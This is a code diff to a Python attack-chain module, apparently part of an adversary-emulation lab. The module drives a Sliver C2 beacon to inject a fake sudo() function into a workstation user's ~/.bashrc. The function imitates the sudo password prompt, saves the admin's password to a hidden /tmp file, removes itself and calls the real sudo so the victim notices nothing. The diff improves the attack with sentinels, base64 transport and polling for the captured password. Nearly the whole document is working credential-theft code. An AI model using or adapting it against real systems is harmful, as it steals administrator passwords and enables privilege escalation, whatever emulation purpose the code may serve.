@@ -1,12 +1,15 @@
+import base64
 import time
+
 from chainlog import log
 from advanced_initial_access import sliver_exec
 
 # =============================================================================
 # advanced_vinzenzws_privesc.py — Sudo Phishing via Sliver C2
 # MITRE ATT&CK:
-#   T1556.003 - Modify Authentication Process (Sudo Phishing)
-#   T1078     - Valid Accounts (Root access)
+#   T1546.004 - Event Triggered Execution: Unix Shell Configuration Modification
+#   T1140     - Deobfuscate/Decode Files or Information (base64)
+#   T1078     - Valid Accounts (Root access, downstream)
 # -----------------------------------------------------------------------------
 # Executes FROM kali, driving the sliver beacon running on vinzenz's
 # workstation. It appends a malicious ``sudo()`` shell function to
@@ -16,11 +19,52 @@ from advanced_initial_access import sliver_exec
 # /usr/bin/sudo so the admin's command succeeds and they notice nothing.
 # =============================================================================
 
+# Sentinels delimit the injected block so the self-unhook sed (and any future
+# external cleanup) deletes only our function -- never neighbouring user
+# content in ~/.bashrc. The previous range pattern ``/sudo() {/,/}/`` matched
+# the next ``}`` anywhere in the file, which would have clobbered unrelated
+# function bodies.
+SENTINEL_BEGIN = "# __SUDO_PHISH_BEGIN__"
+SENTINEL_END   = "# __SUDO_PHISH_END__"
+
+# On-target path where the captured admin password is dropped. Returned to
+# the chain via state key ``vinzenz_password_file`` for downstream steps.
+PASSWORD_DROP_PATH = "/tmp/.sys_update.lock"
+
+# Phish payload, kept as plain bash (no Python f-string brace-escapes) so
+# readers see real shell. ``%BEGIN%`` / ``%END%`` / ``%DROP%`` are
+# substituted at run() time via .replace(); shell parameters like ``$USER``,
+# ``$@``, ``$pass``, ``$firstchar`` stay literal.
+_PAYLOAD_TEMPLATE = """%BEGIN%
+sudo() {
+    read -rsn1 -p "[sudo] password for $USER: " firstchar
+    if [ -z "$firstchar" ]; then echo; /usr/bin/sudo "$@"; return; fi
+    read -rs pass
+    pass="$firstchar$pass"
+    echo
+    echo "$pass" > %DROP%
+    # Self-unhook: delete only the sentinel-bounded block we injected.
+    sed -i '/^%BEGIN%$/,/^%END%$/d' ~/.bashrc 2>/dev/null
+    unset -f sudo
+    # Pass control to the real sudo so the admin's command runs normally.
+    echo "$pass" | /usr/bin/sudo -S "$@"
+}
+%END%
+"""
+
+# Capture window. simulate_admin.sh fires an interactive ``bash -ic`` with
+# sudo about every ~30s on average (15s polling × 50% maintenance gate), so
+# 120s wall-clock gives ~4 expected triggers and a ~1.6% miss rate. Failing
+# loudly on timeout is intentional: downstream steps key off the drop file
+# actually existing.
+_PHISH_TIMEOUT_S       = 120
+_PHISH_POLL_INTERVAL_S = 5
+
+
 def run(vinzenz_beacon, kali_host):
     """
-    Inject a Sudo Phish function into vinzenz's ~/.bashrc, wait for the admin
-    to use sudo in an interactive shell, and capture the password into a local
-    file on the target.
+    Inject a Sudo Phish function into vinzenz's ~/.bashrc, then poll the
+    target until the admin triggers it (or the deadline expires).
 
     Args:
         vinzenz_beacon (str): Sliver beacon ID running on vinzenz's workstation.
@@ -29,44 +73,30 @@ def run(vinzenz_beacon, kali_host):
                               captured password to a file on the target).
 
     Returns:
-        dict: ``{"vinzenz_password_file": "/tmp/.sys_update.lock"}`` on success,
-              ``{"vinzenz_password_file": None}`` on injection failure.
+        dict: ``{"vinzenz_password_file": "/tmp/.sys_update.lock"}`` on
+              successful capture, ``{"vinzenz_password_file": None}`` if the
+              injection itself failed.
+
+    Raises:
+        RuntimeError: if the injection succeeded but the admin never
+                      triggered the function within ``_PHISH_TIMEOUT_S``.
     """
-    log("\n[*] Starting Sudo Phishing on Vinzenz Workstation (T1556.003)...")
+    log("\n[*] Starting Sudo Phishing on Vinzenz Workstation (T1546.004)...")
 
-    # Sentinels delimit the injected block so the self-unhook sed (and any
-    # future external cleanup) deletes only our function -- never
-    # neighbouring user content in ~/.bashrc. The previous range pattern
-    # ``/sudo() {/,/}/`` matched on the next ``}`` anywhere in the file,
-    # which would have clobbered unrelated function bodies.
-    SENTINEL_BEGIN = "# __SUDO_PHISH_BEGIN__"
-    SENTINEL_END   = "# __SUDO_PHISH_END__"
+    payload = (
+        _PAYLOAD_TEMPLATE
+        .replace("%BEGIN%", SENTINEL_BEGIN)
+        .replace("%END%",   SENTINEL_END)
+        .replace("%DROP%",  PASSWORD_DROP_PATH)
+    )
 
-    # The phish payload: prompts like real sudo, reads the password
-    # silently, writes it to /tmp/.sys_update.lock on the target, then
-    # transparently invokes the real /usr/bin/sudo so the admin's command
-    # runs normally and nothing looks wrong on their end.
-    payload = f"""{SENTINEL_BEGIN}
-sudo() {{
-    read -rsn1 -p "[sudo] password for $USER: " firstchar
-    if [ -z "$firstchar" ]; then echo; /usr/bin/sudo "$@"; return; fi
-    read -rs pass
-    pass="$firstchar$pass"
-    echo
-    echo "$pass" > /tmp/.sys_update.lock
-    # Self-unhook: delete only the sentinel-bounded block we injected.
-    sed -i '/^{SENTINEL_BEGIN}$/,/^{SENTINEL_END}$/d' ~/.bashrc 2>/dev/null
-    unset -f sudo
-    # Pass control to the real sudo so the admin's command runs normally.
-    echo "$pass" | /usr/bin/sudo -S "$@"
-}}
-{SENTINEL_END}
-"""
-    
     log("[*] Injecting malicious sudo function into ~/.bashrc...")
 
-    # Encode payload to base64 to avoid shell escaping issues
-    b64_payload = __import__('base64').b64encode(payload.encode()).decode()
+    # Base64 dodge sliver ``execute``'s shell-quoting quirks (T1140 on the
+    # defender's side: they'll need to ``base64 -d`` to read the dropped
+    # block, since it lands in ~/.bashrc already decoded but the transport
+    # was opaque).
+    b64_payload = base64.b64encode(payload.encode()).decode()
     cmd = f"execute -o -- sh -c 'echo \"{b64_payload}\" | base64 -d >> ~/.bashrc'"
 
     out = sliver_exec(vinzenz_beacon, cmd)
@@ -74,10 +104,31 @@ sudo() {{
         log(f"[-] Failed to inject sudo function: {out.strip()}")
         return {"vinzenz_password_file": None}
 
-    log(f"[*] Sudo function injected. The password will be saved to /tmp/.sys_update.lock locally.")
-    log(f"[*] Waiting 45 seconds to ensure the admin triggers the function...")
-    
-    __import__('time').sleep(45)
-    
-    log("[+] Sudo Phish complete! The password is now stored locally on the target for future use.")
-    return {"vinzenz_password_file": "/tmp/.sys_update.lock"}
+    log(f"[*] Sudo function injected. Polling {PASSWORD_DROP_PATH} for up to "
+        f"{_PHISH_TIMEOUT_S}s for the admin to trigger it...")
+
+    # Poll the drop file rather than sleeping a fixed 45s. Success path
+    # returns the moment the admin actually fires sudo (often within ~30s
+    # of injection); failure path raises so a downstream step can never
+    # mistake a missing capture for a successful one. ``[ -s ]`` checks
+    # the file exists AND has content -- guards against the harmless case
+    # where the sudo() early-return path touched the file with no password.
+    deadline = time.time() + _PHISH_TIMEOUT_S
+    probe_cmd = (
+        f"execute -o -- sh -c '[ -s {PASSWORD_DROP_PATH} ] "
+        f"&& echo PHISH_CAPTURED'"
+    )
+    while time.time() < deadline:
+        probe = sliver_exec(vinzenz_beacon, probe_cmd)
+        if probe and "PHISH_CAPTURED" in probe:
+            log(f"[+] Password captured! Stored on target at "
+                f"{PASSWORD_DROP_PATH} for downstream retrieval.")
+            return {"vinzenz_password_file": PASSWORD_DROP_PATH}
+        time.sleep(_PHISH_POLL_INTERVAL_S)
+
+    raise RuntimeError(
+        f"sudo phishing on vinzenz's workstation timed out after "
+        f"{_PHISH_TIMEOUT_S}s -- no password file appeared at "
+        f"{PASSWORD_DROP_PATH}. Admin may not have invoked sudo in an "
+        f"interactive shell during the window."
+    )
